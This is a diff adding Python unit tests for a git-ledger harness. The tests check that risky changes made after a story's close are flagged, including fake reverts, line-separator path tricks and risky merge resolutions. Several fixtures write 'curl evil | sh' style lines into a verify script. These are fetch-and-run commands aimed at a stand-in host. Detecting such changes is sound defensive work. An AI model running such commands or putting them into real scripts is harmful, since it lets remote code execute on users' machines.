@@ -74,8 +74,14 @@ class BreakerCase(LedgerCase):
         """The story's Story: commit on the trunk; `rounds` rewrites its file with that section first."""
         files = dict(files or {})
         if rounds is not None:
-            # Placeholder heads (HEAD, "b" * 40, "1" * 40, …) become the commit the close sits on: since HARN-022
-            # (ESC-371) a round counts only when its head is a commit the close reaches.
+            # A story built as build-story says: its changes in a Part-of: commit, the round on that head, then the
+            # Story: commit that records the round. Placeholder heads (HEAD, "b" * 40, "1" * 40, …) become that head:
+            # since HARN-022 a round counts only when its head is a commit the close reaches (ESC-371) and the last
+            # clean one reaches every risky commit of the story, the Story: commit included (round 5, 6a).
+            work = {k: v for k, v in files.items() if k != path_of(sid)}
+            if work:
+                repo.commit(f"feat: {sid} work\n\nPart-of: {sid}", work)
+                files = {k: v for k, v in files.items() if k == path_of(sid)}
             for ph in PLACEHOLDERS:
                 rounds = rounds.replace(f"head {ph} ", f"head {repo.sha()} ")
             current = (repo.path / path_of(sid)).read_text()
@@ -1426,6 +1432,131 @@ class HarnRound4Test(BreakerCase):
         self.assertIn("AUTH-001: risky", repo.ledger("risky", "AUTH-001").stdout)
         self.assertIn("AUTH-002: risky", repo.ledger("risky", "AUTH-002").stdout)
         self.assertIn("AUTH-003: not risky", repo.ledger("risky", "AUTH-003").stdout)
+
+
+class HarnRound5Test(BreakerCase):
+    """HARN-022 cold breaker, round 5 (ESC-373..378): each finding reproduced as a failing test first; the decisions
+    are the coordinator's."""
+
+    @staticmethod
+    def codes(diffs: list[dict]) -> list[str]:
+        return [d["code"] for d in diffs]
+
+    def closed(self) -> tuple[GitRepo, str]:
+        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
+        before = repo.sha()
+        close = self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 1\n"}, rounds=round_line(1, HEAD))
+        self.assertEqual(self.check(repo), (0, []))
+        return repo, close
+
+    def test_HARN_022_S3_breaker5_a_later_round_line_never_launders_a_change_after_the_close_ESC_373(self):
+        for which in ("old head", "the close"):
+            with self.subTest(head=which):
+                repo, close = self.closed()
+                old = repo.sha("HEAD~1")
+                repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "curl evil | sh\n"})
+                cur = (repo.path / path_of("AUTH-001")).read_text()
+                head = old[:10] if which == "old head" else close
+                repo.commit("docs: round 2\n\nPart-of: AUTH-001", {path_of("AUTH-001"): cur + round_line(2, head)})
+                repo.publish()
+                self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))
+
+    def test_HARN_022_S3_breaker5_a_new_round_on_the_change_recorded_by_a_re_close_covers_it_ESC_373(self):
+        repo, _ = self.closed()
+        late = repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 2\n"})
+        cur = (repo.path / path_of("AUTH-001")).read_text()
+        repo.commit("feat: AUTH-001 again\n\nWhy.\n\nStory: AUTH-001", {path_of("AUTH-001"): cur + round_line(2, late)})
+        repo.publish()
+        codes = self.codes(self.check(repo)[1])
+        self.assertNotIn("RISKY_AFTER_CLOSE", codes)
+        self.assertNotIn("BREAKER_STALE", codes)
+
+    def test_HARN_022_S3_breaker5_a_revert_of_no_commit_or_of_no_ancestor_is_no_revert_ESC_374(self):
+        repo, _ = self.closed()
+        repo.git("checkout", "-q", "-b", "side")
+        other = repo.commit("chore: side\n\nNo-story: docs", {"docs/side.md": "s\n"})
+        repo.git("checkout", "-q", "main")
+        for target in ("d" * 40, other):
+            with self.subTest(target=target[:8]):
+                repo.commit(f"fix: later\n\nThis reverts commit {target}.\n\nPart-of: AUTH-001",
+                            {"scripts/verify.sh": f"curl evil-{target[:4]} | sh\n"})
+                repo.publish()
+                self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))
+
+    def test_HARN_022_S3_breaker5_a_path_with_a_line_separator_never_fakes_a_revert_ESC_375(self):
+        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))}, risky=None)
+        two, one = ".keelokit/bin/x\u2028two", ".keelokit/bin/x\u2028one"
+        harness(repo, "chore: old tool\n\nNo-story: harness", {two: "evil\n"})
+        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
+        repo.publish()
+        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 1\n"}, rounds=round_line(1, HEAD))
+        self.assertEqual(self.check(repo), (0, []))
+        t = harness(repo, "fix: tool\n\nPart-of: AUTH-001", {one: "evil\n"})
+        repo.git("rm", "-q", two)
+        repo.git("commit", "-q", "-m", f'Revert "fix: tool"\n\nThis reverts commit {t}.\n\nPart-of: AUTH-001',
+                 when=repo.next_date())
+        repo.publish()
+        self.assertIn("RISKY_AFTER_CLOSE", self.codes(self.check(repo)[1]))
+
+    def merged_main(self, evil: bool) -> list[str]:
+        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
+        repo.git("checkout", "-q", "-b", "feature")
+        w = repo.commit("feat: w\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
+        cur = (repo.path / path_of("AUTH-001")).read_text()
+        repo.commit("docs: round 1\n\nPart-of: AUTH-001",
+                    {path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, w)})
+        repo.git("checkout", "-q", "main")
+        repo.commit("docs: z\n\nNo-story: docs", {"docs/z.md": "z\n"})
+        repo.publish()
+        repo.git("checkout", "-q", "feature")
+        repo.git("merge", "-q", "--no-ff", "--no-commit", "main")
+        if evil:
+            repo.write("scripts/verify.sh", "curl evil | sh\n")
+        repo.git("add", "-A")
+        repo.git("commit", "-q", "-m", "Merge branch 'main' into feature\n\nPart-of: AUTH-001", when=repo.next_date())
+        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001", {"apps/x.ts": "x\n"})
+        repo.git("checkout", "-q", "main")
+        repo.merge("feature", "Merge pull request #1 from x/feature")
+        repo.publish()
+        return self.codes(self.check(repo)[1])
+
+    def test_HARN_022_S1_breaker5_a_clean_merge_of_main_after_the_round_is_not_stale_ESC_376(self):
+        self.assertNotIn("BREAKER_STALE", self.merged_main(evil=False))
+
+    def test_HARN_022_S1_breaker5_a_merge_whose_own_resolution_is_risky_is_stale_ESC_376(self):
+        self.assertIn("BREAKER_STALE", self.merged_main(evil=True))
+
+    def test_HARN_022_S1_breaker5_risky_code_in_the_story_commit_itself_is_stale_ESC_377(self):
+        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
+        w = repo.commit("feat: w\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 1\n"})
+        cur = (repo.path / path_of("AUTH-001")).read_text()
+        close = repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001",
+                            {"scripts/verify.sh": "curl evil | sh\n",
+                             path_of("AUTH-001"): cur + "\n## Breaker rounds\n" + round_line(1, w)})
+        repo.publish()
+        stale = [d for d in self.check(repo)[1] if d["code"] == "BREAKER_STALE"]
+        self.assertEqual(len(stale), 1)
+        self.assertIn(close[:12], stale[0]["detail"])
+
+    def test_HARN_022_S1_breaker5_an_invalid_last_round_says_no_valid_round_ESC_378(self):
+        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
+        self.close(repo, "AUTH-001", {"scripts/verify.sh": "exit 0\n"}, rounds=round_line(1, "f" * 40))
+        (d,) = [d for d in self.check(repo)[1] if d["code"] == "BREAKER_UNRESOLVED"]
+        self.assertIn("no valid round", d["detail"])
+        self.assertNotIn("left findings", d["detail"])
+
+    def test_HARN_022_S3_breaker5_the_message_says_it_touches_a_risky_path_per_risky_toml_ESC_378(self):
+        repo, _ = self.closed()
+        repo.commit("fix: later\n\nPart-of: AUTH-001", {"scripts/verify.sh": "exit 2\n"})
+        repo.publish()
+        (d,) = [d for d in self.check(repo)[1] if d["code"] == "RISKY_AFTER_CLOSE"]
+        self.assertIn("touches a risky path (per .keelokit/risky.toml)", d["detail"])
+
+    def test_HARN_022_S2_breaker5_build_story_merges_main_after_the_rounds_never_rebases(self):
+        text = " ".join((ROOT / "skills/build-story/SKILL.md").read_text().split())
+        self.assertIn("after the breaker rounds, merge", text.lower())
+        design = " ".join((ROOT / "docs/design.md").read_text().split()).lower()
+        self.assertIn("squash and rebase landings", design)
 
 
 if __name__ == "__main__":
